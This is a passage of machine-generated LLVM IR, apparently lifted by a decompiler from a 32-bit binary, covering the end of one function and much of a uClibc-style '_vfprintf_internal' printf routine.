  %v2_804e274 = add i32 %v0_804e274, %v1_804e274
  br label %dec_label_pc_804e276

dec_label_pc_804e276:                             ; preds = %dec_label_pc_804e244, %dec_label_pc_804e274
  %v0_804e279 = phi i32 [ %v0_804e24f, %dec_label_pc_804e244 ], [ %v2_804e274, %dec_label_pc_804e274 ]
  ret i32 %v0_804e279

; uselistorder directives
  uselistorder i32 %v0_804e267, { 1, 0 }
  uselistorder i32 %v0_804e24f, { 1, 0, 2 }
  uselistorder i32 %v1_804e244, { 1, 0 }
  uselistorder i32 %v2_804e23c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e276, { 1, 0 }
  uselistorder label %dec_label_pc_804e274, { 1, 0 }
  uselistorder label %dec_label_pc_804e25c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804e28a = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e28a, i32* @ebx, align 4
  %v2_804e292 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e292, i32* @esi, align 4
  %v5_804e297 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e28a)
  store i32 %v5_804e297, i32* %eax.global-to-local, align 4
  %v2_804e29f = icmp slt i32 %v5_804e297, 0
  %v1_804e2a1 = icmp eq i1 %v2_804e29f, false
  br i1 %v1_804e2a1, label %dec_label_pc_804e2e1, label %dec_label_pc_804e2a3

dec_label_pc_804e2a3:                             ; preds = %entry
  %v3_804e2a3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e2a3, i32* @ebx, align 4
  %v5_804e2aa = inttoptr i32 %v3_804e2a3 to i8*
  %v3_804e2ab = call i32 @strlen(i8* %v5_804e2aa)
  store i32 %v3_804e2ab, i32* %eax.global-to-local, align 4
  %v1_804e2b3 = icmp eq i32 %v3_804e2ab, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804e2b3, label %dec_label_pc_804e81a, label %dec_label_pc_804e2c2

dec_label_pc_804e2c2:                             ; preds = %dec_label_pc_804e2a3
  %v0_804e2c2 = load i32, i32* @edx, align 4
  %v0_804e2cb = load i32, i32* @ebx, align 4
  %v6_804e2cc = call i32 @__stdio_fwrite(i32 %v0_804e2cb, i32 %v3_804e2ab, i32 %arg1, i32 %v0_804e2c2)
  store i32 %v6_804e2cc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804e81a

dec_label_pc_804e2e1:                             ; preds = %entry
  %v6_804e2eb = call i32 @_ppfs_prepargs(i32 %v2_804e292, i32 %arg3, i32 %v5_804e297, i32 %v5_804e297)
  store i32 %v6_804e2eb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e2f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e2f8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e300

dec_label_pc_804e2ff:                             ; preds = %dec_label_pc_804e306
  %v1_804e2ff = add i32 %v0_804e30e, 1
  store i32 %v1_804e2ff, i32* @ebx, align 4
  br label %dec_label_pc_804e300.backedge

dec_label_pc_804e300.backedge:                    ; preds = %dec_label_pc_804e2ff, %dec_label_pc_804e800, %dec_label_pc_804e80b
  %v1_804e30a19 = phi i32 [ %v1_804e312, %dec_label_pc_804e2ff ], [ %v3_804e800, %dec_label_pc_804e800 ], [ %v1_804e33e, %dec_label_pc_804e80b ]
  %v0_804e30017 = phi i32 [ %v1_804e2ff, %dec_label_pc_804e2ff ], [ %v3_804e800, %dec_label_pc_804e800 ], [ %v1_804e80b, %dec_label_pc_804e80b ]
  %v4_804e300.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e300

dec_label_pc_804e300:                             ; preds = %dec_label_pc_804e300.backedge, %dec_label_pc_804e2e1
  %v1_804e312 = phi i32 [ %v1_804e30a19, %dec_label_pc_804e300.backedge ], [ %v0_804e2f8, %dec_label_pc_804e2e1 ]
  %v0_804e30e = phi i32 [ %v0_804e30017, %dec_label_pc_804e300.backedge ], [ %v0_804e2f8, %dec_label_pc_804e2e1 ]
  %v4_804e300 = phi i32 [ %v4_804e300.pre, %dec_label_pc_804e300.backedge ], [ %v6_804e2eb, %dec_label_pc_804e2e1 ]
  %v1_804e300 = inttoptr i32 %v0_804e30e to i8*
  %v2_804e300 = load i8, i8* %v1_804e300, align 1
  %v3_804e300 = zext i8 %v2_804e300 to i32
  %v5_804e300 = and i32 %v4_804e300, -256
  %v6_804e300 = or i32 %v3_804e300, %v5_804e300
  store i32 %v6_804e300, i32* %eax.global-to-local, align 4
  %v4_804e302 = icmp eq i8 %v2_804e300, 0
  br i1 %v4_804e302, label %dec_label_pc_804e30a, label %dec_label_pc_804e306

dec_label_pc_804e306:                             ; preds = %dec_label_pc_804e300
  %v10_804e306 = icmp eq i8 %v2_804e300, 37
  %v1_804e308 = icmp eq i1 %v10_804e306, false
  br i1 %v1_804e308, label %dec_label_pc_804e2ff, label %dec_label_pc_804e30a

dec_label_pc_804e30a:                             ; preds = %dec_label_pc_804e306, %dec_label_pc_804e300
  %v2_804e30a = sub i32 %v0_804e30e, %v1_804e312
  %v12_804e30a = icmp eq i32 %v2_804e30a, 0
  br i1 %v12_804e30a, label %dec_label_pc_804e335, label %dec_label_pc_804e30e

dec_label_pc_804e30e:                             ; preds = %dec_label_pc_804e30a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e30a, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_804e30a, 1
  br i1 %tmp66, label %dec_label_pc_804e32a, label %dec_label_pc_804e318

dec_label_pc_804e318:                             ; preds = %dec_label_pc_804e30e
  %v0_804e318 = load i32, i32* @ebp, align 4
  %v1_804e318 = load i32, i32* @esp, align 4
  %v2_804e318 = add i32 %v1_804e318, -4
  %v3_804e318 = inttoptr i32 %v2_804e318 to i32*
  store i32 %v0_804e318, i32* %v3_804e318, align 4
  %v1_804e319 = add i32 %v1_804e318, 368
  %v2_804e319 = inttoptr i32 %v1_804e319 to i32*
  %v3_804e319 = load i32, i32* %v2_804e319, align 4
  %v5_804e319 = add i32 %v1_804e318, -8
  %v6_804e319 = inttoptr i32 %v5_804e319 to i32*
  store i32 %v3_804e319, i32* %v6_804e319, align 4
  %v0_804e320 = load i32, i32* @esi, align 4
  %v2_804e320 = add i32 %v1_804e318, -12
  %v3_804e320 = inttoptr i32 %v2_804e320 to i32*
  store i32 %v0_804e320, i32* %v3_804e320, align 4
  %v0_804e321 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e321 = add i32 %v1_804e318, -16
  %v3_804e321 = inttoptr i32 %v2_804e321 to i32*
  store i32 %v0_804e321, i32* %v3_804e321, align 4
  %v0_804e322 = load i32, i32* %stack_var_-364, align 4
  %v4_804e322 = call i32 @__stdio_fwrite(i32 %v0_804e322, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e322, i32* %eax.global-to-local, align 4
  %v1_804e32a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e32a

dec_label_pc_804e32a:                             ; preds = %dec_label_pc_804e30e, %dec_label_pc_804e318
  %v3_804e332 = phi i32 [ %v2_804e30a, %dec_label_pc_804e30e ], [ %v1_804e32a.pre, %dec_label_pc_804e318 ]
  %v0_804e32a = phi i32 [ 0, %dec_label_pc_804e30e ], [ %v4_804e322, %dec_label_pc_804e318 ]
  %v12_804e32a = icmp eq i32 %v0_804e32a, %v3_804e332
  %v1_804e32c = icmp eq i1 %v12_804e32a, false
  %v0_804e813.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e32c, label %dec_label_pc_804e813, label %dec_label_pc_804e332

dec_label_pc_804e332:                             ; preds = %dec_label_pc_804e32a
  %v1_804e332 = inttoptr i32 %v0_804e813.pre.pre to i32*
  %v2_804e332 = load i32, i32* %v1_804e332, align 4
  %v4_804e332 = add i32 %v2_804e332, %v3_804e332
  store i32 %v4_804e332, i32* %v1_804e332, align 4
  %v0_804e335.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e335

dec_label_pc_804e335:                             ; preds = %dec_label_pc_804e30a, %dec_label_pc_804e332
  %v0_804e80b = phi i32 [ %v0_804e30e, %dec_label_pc_804e30a ], [ %v0_804e335.pre, %dec_label_pc_804e332 ]
  %v1_804e335 = inttoptr i32 %v0_804e80b to i8*
  %v2_804e335 = load i8, i8* %v1_804e335, align 1
  %v3_804e335 = icmp eq i8 %v2_804e335, 0
  br i1 %v3_804e335, label %dec_label_pc_804e81a, label %dec_label_pc_804e33e

dec_label_pc_804e33e:                             ; preds = %dec_label_pc_804e335
  %v1_804e33e = add i32 %v0_804e80b, 1
  store i32 %v1_804e33e, i32* %edx.global-to-local, align 4
  %v2_804e341 = inttoptr i32 %v1_804e33e to i8*
  %v3_804e341 = load i8, i8* %v2_804e341, align 1
  %v12_804e341 = icmp eq i8 %v3_804e341, 37
  br i1 %v12_804e341, label %dec_label_pc_804e80b, label %dec_label_pc_804e34b

dec_label_pc_804e34b:                             ; preds = %dec_label_pc_804e33e
  %v1_804e34b = load i32, i32* @esp, align 4
  %v2_804e34b = add i32 %v1_804e34b, 16
  %v3_804e34b = inttoptr i32 %v2_804e34b to i32*
  store i32 %v1_804e33e, i32* %v3_804e34b, align 4
  %v0_804e34f = load i32, i32* @esp, align 4
  %v1_804e34f = add i32 %v0_804e34f, 340
  %v2_804e34f = inttoptr i32 %v1_804e34f to i32*
  store i32 0, i32* %v2_804e34f, align 4
  %v0_804e35a = load i32, i32* @esp, align 4
  %v1_804e35d = add i32 %v0_804e35a, 16
  store i32 %v1_804e35d, i32* @ebx, align 4
  %v2_804e361 = add i32 %v0_804e35a, -16
  %v3_804e361 = inttoptr i32 %v2_804e361 to i32*
  store i32 %v1_804e35d, i32* %v3_804e361, align 4
  %v0_804e362 = load i32, i32* %stack_var_-364, align 4
  %v1_804e362 = inttoptr i32 %v0_804e362 to i32*
  %v2_804e362 = call i32 @_ppfs_parsespec(i32* %v1_804e362)
  store i32 %v2_804e362, i32* %eax.global-to-local, align 4
  %v0_804e367 = load i32, i32* @ebx, align 4
  %v1_804e367 = load i32, i32* @esp, align 4
  %v2_804e367 = inttoptr i32 %v1_804e367 to i32*
  store i32 %v0_804e367, i32* %v2_804e367, align 4
  %v0_804e36a = load i32, i32* %stack_var_-364, align 4
  %v1_804e36a = call i32 @_ppfs_setargs(i32 %v0_804e36a)
  store i32 %v1_804e36a, i32* %eax.global-to-local, align 4
  %v0_804e36f = load i32, i32* @esp, align 4
  %v1_804e36f = add i32 %v0_804e36f, 70
  %v2_804e36f = inttoptr i32 %v1_804e36f to i8*
  %v3_804e36f = load i8, i8* %v2_804e36f, align 1
  %v4_804e36f = zext i8 %v3_804e36f to i32
  store i32 %v4_804e36f, i32* @edi, align 4
  %v1_804e374 = add i32 %v0_804e36f, 16
  %v1_804e377 = add i32 %v0_804e36f, 56
  %v2_804e377 = inttoptr i32 %v1_804e377 to i32*
  %v3_804e377 = load i32, i32* %v2_804e377, align 4
  %v1_804e37c = add i32 %v0_804e36f, 112
  store i32 %v1_804e37c, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_804e377, 1
  br i1 %tmp67, label %dec_label_pc_804e389, label %dec_label_pc_804e382

dec_label_pc_804e382:                             ; preds = %dec_label_pc_804e34b
  %v2_804e382 = zext i8 %v3_804e36f to i32
  %v3_804e382 = mul nuw nsw i32 %v2_804e382, 12
  store i32 %v3_804e382, i32* %eax.global-to-local, align 4
  %v2_804e385 = add i32 %v0_804e36f, 100
  %v3_804e385 = add i32 %v2_804e385, %v3_804e382
  store i32 %v3_804e385, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e389

dec_label_pc_804e389:                             ; preds = %dec_label_pc_804e34b, %dec_label_pc_804e382
  %v0_804e39127 = phi i32 [ %v1_804e37c, %dec_label_pc_804e34b ], [ %v3_804e385, %dec_label_pc_804e382 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e38b = add i32 %v0_804e36f, 60
  %v2_804e38b = inttoptr i32 %v1_804e38b to i32*
  %v3_804e38b = load i32, i32* %v2_804e38b, align 4
  store i32 %v3_804e38b, i32* %ecx.global-to-local, align 4
  %v2_804e39c80 = sub i32 0, %v3_804e38b
  %v10_804e39c83 = and i32 %v3_804e38b, %v2_804e39c80
  %v11_804e39c84 = icmp slt i32 %v10_804e39c83, 0
  %v13_804e39c85 = icmp slt i32 %v2_804e39c80, 0
  %v2_804e39e86 = icmp eq i1 %v13_804e39c85, %v11_804e39c84
  br i1 %v2_804e39e86, label %dec_label_pc_804e3a0, label %dec_label_pc_804e391

dec_label_pc_804e391:                             ; preds = %dec_label_pc_804e389, %dec_label_pc_804e391
  %v0_804e3a090 = phi i32 [ %v0_804e3a0, %dec_label_pc_804e391 ], [ %v1_804e374, %dec_label_pc_804e389 ]
  %v2_804e39189 = phi i32 [ %v1_804e39b, %dec_label_pc_804e391 ], [ 0, %dec_label_pc_804e389 ]
  %v0_804e39188 = phi i32 [ %v1_804e398, %dec_label_pc_804e391 ], [ %v0_804e39127, %dec_label_pc_804e389 ]
  %v3_804e391 = mul i32 %v2_804e39189, 4
  %v4_804e391 = add i32 %v0_804e3a090, 344
  %v5_804e391 = add i32 %v4_804e391, %v3_804e391
  %v6_804e391 = inttoptr i32 %v5_804e391 to i32*
  store i32 %v0_804e39188, i32* %v6_804e391, align 4
  %v0_804e398 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e398 = add i32 %v0_804e398, 12
  store i32 %v1_804e398, i32* %edx.global-to-local, align 4
  %v0_804e39b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e39b = add i32 %v0_804e39b, 1
  store i32 %v1_804e39b, i32* %eax.global-to-local, align 4
  %v1_804e39c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e39c = sub i32 %v1_804e39b, %v1_804e39c.pre
  %v8_804e39c = xor i32 %v1_804e39b, %v1_804e39c.pre
  %v9_804e39c = xor i32 %v2_804e39c, %v1_804e39b
  %v10_804e39c = and i32 %v9_804e39c, %v8_804e39c
  %v11_804e39c = icmp slt i32 %v10_804e39c, 0
  %v13_804e39c = icmp slt i32 %v2_804e39c, 0
  %v2_804e39e = icmp eq i1 %v13_804e39c, %v11_804e39c
  %v0_804e3a0 = load i32, i32* @esp, align 4
  br i1 %v2_804e39e, label %dec_label_pc_804e3a0, label %dec_label_pc_804e391

dec_label_pc_804e3a0:                             ; preds = %dec_label_pc_804e391, %dec_label_pc_804e389
  %v0_804e3a0.lcssa = phi i32 [ %v1_804e374, %dec_label_pc_804e389 ], [ %v0_804e3a0, %dec_label_pc_804e391 ]
  %v1_804e3a0 = add i32 %v0_804e3a0.lcssa, 48
  %v2_804e3a0 = inttoptr i32 %v1_804e3a0 to i32*
  %v3_804e3a0 = load i32, i32* %v2_804e3a0, align 4
  store i32 %v3_804e3a0, i32* @ecx, align 4
  %v1_804e3a4 = icmp eq i32 %v3_804e3a0, 0
  %v1_804e3a6 = icmp eq i1 %v1_804e3a4, false
  br i1 %v1_804e3a6, label %dec_label_pc_804e3ce, label %dec_label_pc_804e3a8

dec_label_pc_804e3a8:                             ; preds = %dec_label_pc_804e3a0
  %v1_804e3a8 = inttoptr i32 %v0_804e3a0.lcssa to i32*
  %v2_804e3a8 = load i32, i32* %v1_804e3a8, align 4
  store i32 %v2_804e3a8, i32* %eax.global-to-local, align 4
  %v1_804e3ab = ashr i32 %v2_804e3a8, 31
  store i32 %v1_804e3ab, i32* %edx.global-to-local, align 4
  %v2_804e3ac = add i32 %v0_804e3a0.lcssa, -4
  %v3_804e3ac = inttoptr i32 %v2_804e3ac to i32*
  store i32 %v1_804e3ab, i32* %v3_804e3ac, align 4
  %v0_804e3ad = load i32, i32* %eax.global-to-local, align 4
  %v2_804e3ad = add i32 %v0_804e3a0.lcssa, -8
  %v3_804e3ad = inttoptr i32 %v2_804e3ad to i32*
  store i32 %v0_804e3ad, i32* %v3_804e3ad, align 4
  %v1_804e3ae = add i32 %v0_804e3a0.lcssa, 32
  %v2_804e3ae = inttoptr i32 %v1_804e3ae to i32*
  %v3_804e3ae = load i32, i32* %v2_804e3ae, align 4
  %v1_804e3b2 = and i32 %v3_804e3ae, 3840
  store i32 %v1_804e3b2, i32* %eax.global-to-local, align 4
  %v2_804e3b7 = add i32 %v0_804e3a0.lcssa, -12
  %v3_804e3b7 = inttoptr i32 %v2_804e3b7 to i32*
  store i32 %v1_804e3b2, i32* %v3_804e3b7, align 4
  %v1_804e3b8 = add i32 %v0_804e3a0.lcssa, 344
  %v2_804e3b8 = inttoptr i32 %v1_804e3b8 to i32*
  %v3_804e3b8 = load i32, i32* %v2_804e3b8, align 4
  store i32 %v3_804e3b8, i32* %eax.global-to-local, align 4
  %v1_804e3bf = inttoptr i32 %v3_804e3b8 to i32*
  %v2_804e3bf = load i32, i32* %v1_804e3bf, align 4
  %v4_804e3bf = add i32 %v0_804e3a0.lcssa, -16
  %v5_804e3bf = inttoptr i32 %v4_804e3bf to i32*
  store i32 %v2_804e3bf, i32* %v5_804e3bf, align 4
  %v0_804e3c1 = call i32 @_store_inttype()
  store i32 %v0_804e3c1, i32* %eax.global-to-local, align 4
  %v0_804e3c6 = load i32, i32* @esp, align 4
  %v1_804e3c6 = add i32 %v0_804e3c6, 16
  br label %dec_label_pc_804e800

dec_label_pc_804e3ce:                             ; preds = %dec_label_pc_804e3a0
  %tmp93 = icmp ult i32 %v3_804e3a0, 8
  br i1 %tmp93, label %dec_label_pc_804e3d7, label %dec_label_pc_804e538

dec_label_pc_804e3d7:                             ; preds = %dec_label_pc_804e3ce
  %v1_804e3d7 = add i32 %v3_804e3a0, 134573584
  %v2_804e3d7 = inttoptr i32 %v1_804e3d7 to i8*
  %v3_804e3d7 = load i8, i8* %v2_804e3d7, align 1
  %v4_804e3d7 = sext i8 %v3_804e3d7 to i32
  store i32 %v4_804e3d7, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e3e3 = icmp eq i8 %v3_804e3d7, 10
  %v1_804e3e6 = icmp eq i1 %v9_804e3e3, false
  br i1 %v1_804e3e6, label %dec_label_pc_804e404, label %dec_label_pc_804e3e8

dec_label_pc_804e3e8:                             ; preds = %dec_label_pc_804e3d7
  %v1_804e3e8 = add i32 %v0_804e3a0.lcssa, 32
  %v2_804e3e8 = inttoptr i32 %v1_804e3e8 to i32*
  %v3_804e3e8 = load i32, i32* %v2_804e3e8, align 4
  %v1_804e3ee = and i32 %v3_804e3e8, 32
  store i32 %v1_804e3ee, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_804e3ee, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_804e3fc = trunc i32 %v3_804e3e8 to i8
  %v2_804e3fc = and i8 %v1_804e3fc, 64
  %v3_804e3fc = icmp eq i8 %v2_804e3fc, 0
  %v5_804e3fc = zext i8 %v2_804e3fc to i32
  %v7_804e3fc = and i32 %v3_804e3e8, -256
  %v8_804e3fc = or i32 %v5_804e3fc, %v7_804e3fc
  store i32 %v8_804e3fc, i32* %edx.global-to-local, align 4
  br i1 %v3_804e3fc, label %dec_label_pc_804e404, label %dec_label_pc_804e401

dec_label_pc_804e401:                             ; preds = %dec_label_pc_804e3e8
  %v2_804e401 = or i32 %tmp69, 128
  store i32 %v2_804e401, i32* @ebx, align 4
  br label %dec_label_pc_804e404

dec_label_pc_804e404:                             ; preds = %dec_label_pc_804e3e8, %dec_label_pc_804e3d7, %dec_label_pc_804e401
  %tmp94 = icmp ult i32 %v3_804e3a0, 6
  br i1 %tmp94, label %dec_label_pc_804e409, label %dec_label_pc_804e421

dec_label_pc_804e409:                             ; preds = %dec_label_pc_804e404
  %v9_804e409 = icmp eq i32 %v3_804e3a0, 3
  %v1_804e40c = icmp eq i1 %v9_804e409, false
  br i1 %v1_804e40c, label %dec_label_pc_804e415, label %dec_label_pc_804e40e

dec_label_pc_804e40e:                             ; preds = %dec_label_pc_804e409
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e423

dec_label_pc_804e415:                             ; preds = %dec_label_pc_804e409
  %v9_804e41a = icmp eq i32 %v3_804e3a0, 1
  br i1 %v9_804e41a, label %dec_label_pc_804e428, label %dec_label_pc_804e423

dec_label_pc_804e421:                             ; preds = %dec_label_pc_804e404
  %v1_804e421 = sub nsw i32 0, %v4_804e3d7
  store i32 %v1_804e421, i32* @esi, align 4
  br label %dec_label_pc_804e423

dec_label_pc_804e423:                             ; preds = %dec_label_pc_804e415, %dec_label_pc_804e40e, %dec_label_pc_804e421
  br label %dec_label_pc_804e428

dec_label_pc_804e428:                             ; preds = %dec_label_pc_804e415, %dec_label_pc_804e423
  %storemerge105 = phi i32 [ 11, %dec_label_pc_804e423 ], [ 6, %dec_label_pc_804e415 ]
  store i32 %storemerge105, i32* @ebp, align 4
  %v1_804e428 = add i32 %v0_804e3a0.lcssa, 7
  %v2_804e428 = inttoptr i32 %v1_804e428 to i8*
  store i8 32, i8* %v2_804e428, align 1
  %v0_804e42d = load i32, i32* @esp, align 4
  %v1_804e42d = add i32 %v0_804e42d, 20
  %v2_804e42d = inttoptr i32 %v1_804e42d to i32*
  %v3_804e42d = load i32, i32* %v2_804e42d, align 4
  %v5_804e42d = icmp slt i32 %v3_804e42d, 0
  %v1_804e432 = icmp eq i1 %v5_804e42d, false
  br i1 %v1_804e432, label %dec_label_pc_804e43c, label %dec_label_pc_804e434

dec_label_pc_804e434:                             ; preds = %dec_label_pc_804e428
  %v1_804e434 = add i32 %v0_804e42d, 36
  %v2_804e434 = inttoptr i32 %v1_804e434 to i8*
  %v3_804e434 = load i8, i8* %v2_804e434, align 1
  %v4_804e434 = zext i8 %v3_804e434 to i32
  %v5_804e434 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e434 = and i32 %v5_804e434, -256
  %v7_804e434 = or i32 %v6_804e434, %v4_804e434
  store i32 %v7_804e434, i32* %edx.global-to-local, align 4
  %v3_804e438 = add i32 %v0_804e42d, 7
  %v4_804e438 = inttoptr i32 %v3_804e438 to i8*
  store i8 %v3_804e434, i8* %v4_804e438, align 1
  %v0_804e43c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e43c

dec_label_pc_804e43c:                             ; preds = %dec_label_pc_804e428, %dec_label_pc_804e434
  %v1_804e455 = phi i32 [ %v0_804e42d, %dec_label_pc_804e428 ], [ %v0_804e43c.pre, %dec_label_pc_804e434 ]
  %v1_804e43c = add i32 %v1_804e455, 344
  %v2_804e43c = inttoptr i32 %v1_804e43c to i32*
  %v3_804e43c = load i32, i32* %v2_804e43c, align 4
  store i32 %v3_804e43c, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804e448 = add i32 %v3_804e3a0, -1
  %v8_804e448 = icmp eq i32 %v1_804e448, 0
  store i32 %v1_804e448, i32* %ecx.global-to-local, align 4
  %v0_804e455.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e448, label %dec_label_pc_804e455, label %dec_label_pc_804e44b

dec_label_pc_804e44b:                             ; preds = %dec_label_pc_804e43c
  %v2_804e44b = mul i32 %v0_804e455.pre, 4
  %v3_804e44b = add i32 %v1_804e455, 52
  %v4_804e44b = add i32 %v3_804e44b, %v2_804e44b
  %v5_804e44b = inttoptr i32 %v4_804e44b to i32*
  %v6_804e44b = load i32, i32* %v5_804e44b, align 4
  %v1_804e44f = and i32 %v6_804e44b, 3840
  store i32 %v1_804e44f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e455

dec_label_pc_804e455:                             ; preds = %dec_label_pc_804e43c, %dec_label_pc_804e44b
  %v2_804e455 = add i32 %v1_804e455, -4
  %v3_804e455 = inttoptr i32 %v2_804e455 to i32*
  store i32 %v0_804e455.pre, i32* %v3_804e455, align 4
  %v0_804e456 = load i32, i32* @esi, align 4
  %v2_804e456 = add i32 %v1_804e455, -8
  %v3_804e456 = inttoptr i32 %v2_804e456 to i32*
  store i32 %v0_804e456, i32* %v3_804e456, align 4
  %v0_804e457 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e457 = add i32 %v1_804e455, -12
  %v3_804e457 = inttoptr i32 %v2_804e457 to i32*
  store i32 %v0_804e457, i32* %v3_804e457, align 4
  %v0_804e458 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e458 = add i32 %v1_804e455, -16
  %v3_804e458 = inttoptr i32 %v2_804e458 to i32*
  store i32 %v0_804e458, i32* %v3_804e458, align 4
  %v0_804e459 = call i32 @_load_inttype()
  %v0_804e45e = load i32, i32* @ebx, align 4
  %v1_804e45e = load i32, i32* @esp, align 4
  %v2_804e45e = inttoptr i32 %v1_804e45e to i32*
  store i32 %v0_804e45e, i32* %v2_804e45e, align 4
  %v0_804e461 = load i32, i32* @esi, align 4
  %v1_804e461 = load i32, i32* @esp, align 4
  %v2_804e461 = add i32 %v1_804e461, -4
  %v3_804e461 = inttoptr i32 %v2_804e461 to i32*
  store i32 %v0_804e461, i32* %v3_804e461, align 4
  %v0_804e462 = load i32, i32* @edx, align 4
  %v2_804e462 = add i32 %v1_804e461, -8
  %v3_804e462 = inttoptr i32 %v2_804e462 to i32*
  store i32 %v0_804e462, i32* %v3_804e462, align 4
  %v2_804e463 = add i32 %v1_804e461, -12
  %v3_804e463 = inttoptr i32 %v2_804e463 to i32*
  store i32 %v0_804e459, i32* %v3_804e463, align 4
  %v1_804e464 = add i32 %v1_804e461, 347
  store i32 %v1_804e464, i32* %eax.global-to-local, align 4
  %v2_804e46b = add i32 %v1_804e461, -16
  %v3_804e46b = inttoptr i32 %v2_804e46b to i32*
  store i32 %v1_804e464, i32* %v3_804e46b, align 4
  %v0_804e46c = load i32, i32* %stack_var_-364, align 4
  %v5_804e46c = inttoptr i32 %v0_804e46c to i8*
  %v6_804e46c = call i32 @_uintmaxtostr(i8* %v5_804e46c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e46c, i32* %eax.global-to-local, align 4
  %v0_804e471 = load i32, i32* @esp, align 4
  %v1_804e471 = add i32 %v0_804e471, 32
  store i32 %v6_804e46c, i32* @edi, align 4
  %v1_804e476 = add i32 %v0_804e471, 80
  %v2_804e476 = inttoptr i32 %v1_804e476 to i32*
  %v3_804e476 = load i32, i32* %v2_804e476, align 4
  %tmp95 = icmp ult i32 %v3_804e476, 6
  br i1 %tmp95, label %dec_label_pc_804e4a4, label %dec_label_pc_804e47d

dec_label_pc_804e47d:                             ; preds = %dec_label_pc_804e455
  %v1_804e47d = inttoptr i32 %v6_804e46c to i8*
  %v2_804e47d = load i8, i8* %v1_804e47d, align 1
  %v11_804e47d = icmp eq i8 %v2_804e47d, 45
  %v1_804e480 = icmp eq i1 %v11_804e47d, false
  %v1_804e48f = add i32 %v0_804e471, 64
  %v2_804e48f = inttoptr i32 %v1_804e48f to i32*
  %v3_804e48f = load i32, i32* %v2_804e48f, align 4
  br i1 %v1_804e480, label %dec_label_pc_804e48f, label %dec_label_pc_804e482

dec_label_pc_804e482:                             ; preds = %dec_label_pc_804e47d
  %v4_804e482 = or i32 %v3_804e48f, 2
  store i32 %v4_804e482, i32* %v2_804e48f, align 4
  %v0_804e487 = load i32, i32* @edi, align 4
  %v1_804e487 = add i32 %v0_804e487, 1
  store i32 %v1_804e487, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e4a4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e4a4

dec_label_pc_804e48f:                             ; preds = %dec_label_pc_804e47d
  store i32 %v3_804e48f, i32* %eax.global-to-local, align 4
  %v2_804e493 = and i32 %v3_804e48f, 2
  %v3_804e493 = icmp eq i32 %v2_804e493, 0
  br i1 %v3_804e493, label %dec_label_pc_804e49b, label %dec_label_pc_804e497

dec_label_pc_804e497:                             ; preds = %dec_label_pc_804e48f
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e4a4

dec_label_pc_804e49b:                             ; preds = %dec_label_pc_804e48f
  %v2_804e49b = urem i32 %v3_804e48f, 2
  %v3_804e49b = icmp eq i32 %v2_804e49b, 0
  br i1 %v3_804e49b, label %dec_label_pc_804e4a4, label %dec_label_pc_804e49f

dec_label_pc_804e49f:                             ; preds = %dec_label_pc_804e49b
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804e4a4

dec_label_pc_804e4a4:                             ; preds = %dec_label_pc_804e49b, %dec_label_pc_804e455, %dec_label_pc_804e497, %dec_label_pc_804e482, %dec_label_pc_804e49f
  %v0_804e4f7 = phi i32 [ %v6_804e46c, %dec_label_pc_804e49b ], [ %v6_804e46c, %dec_label_pc_804e455 ], [ %v6_804e46c, %dec_label_pc_804e497 ], [ %v1_804e487, %dec_label_pc_804e482 ], [ %v6_804e46c, %dec_label_pc_804e49f ]
  %v0_804e506 = phi i32 [ %v1_804e471, %dec_label_pc_804e49b ], [ %v1_804e471, %dec_label_pc_804e455 ], [ %v1_804e471, %dec_label_pc_804e497 ], [ %v0_804e4a4.pre, %dec_label_pc_804e482 ], [ %v1_804e471, %dec_label_pc_804e49f ]
